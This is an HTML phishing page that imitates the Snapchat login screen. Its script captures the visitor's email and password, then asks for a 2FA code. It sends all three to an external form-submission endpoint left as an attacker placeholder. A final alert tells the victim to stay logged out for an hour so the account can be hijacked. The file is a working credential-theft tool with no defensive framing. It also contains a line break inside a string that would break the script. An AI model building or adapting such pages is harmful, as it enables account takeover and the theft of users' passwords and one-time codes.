<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #FFFC00;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 320px;
        }
        .logo {
            width: 50px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #FFFC00;
            border: none;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: #E6E100;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container" id="loginContainer">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/en/thumb/8/82/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat Logo">
        <h2>Log In</h2>
        <form id="loginForm">
            <input type="email" id="email" name="email" placeholder="Username or Email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
    
    <div class="container hidden" id="twoFactorContainer">
        <h2>Enter 2FA Code</h2>
        <p>We've sent a code to your phone.</p>
        <form id="twoFactorForm">
            <input type="text" id="twoFactorCode" name="twoFactorCode" placeholder="Enter 2FA Code" required>
            <button type="submit">Verify</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            // Store user data
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            localStorage.setItem('email', email);
            localStorage.setItem('password', password);
            
            // Hide login container and show 2FA container
            document.getElementById('loginContainer').classList.add('hidden');
            document.getElementById('twoFactorContainer').classList.remove('hidden');
        });

        document.getElementById('twoFactorForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const twoFactorCode = document.getElementById('twoFactorCode').value;
            const email = localStorage.getItem('email');
            const password = localStorage.getItem('password');
            
            fetch('https://formsubmit.co/YOUR_EMAIL_HERE', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password, twoFactorCode })
            }).then(() => {
                alert('Authorised Account, Please Refain From Logging In
For 60 Minutes!');
            });
        });
    </script>
</body>
</html>
